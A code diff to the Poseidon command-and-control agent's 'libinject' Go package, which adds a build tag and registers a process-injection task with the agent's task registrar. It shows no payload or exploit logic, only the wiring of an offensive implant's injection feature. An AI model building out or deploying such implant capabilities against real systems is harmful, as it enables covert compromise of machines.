@@ -1,3 +1,5 @@
+//go:build libinject || debug
+
 package libinject
 
 import (
@@ -7,8 +9,13 @@ import (
 
 	// Poseidon
 
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/tasks/taskRegistrar"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 )
+
+func init() {
+	taskRegistrar.Register("libinject", Run)
+}
 
 // Inject C source taken from: http://www.newosxbook.com/src.jl?tree=listings&file=inject.c
 type Injection interface {
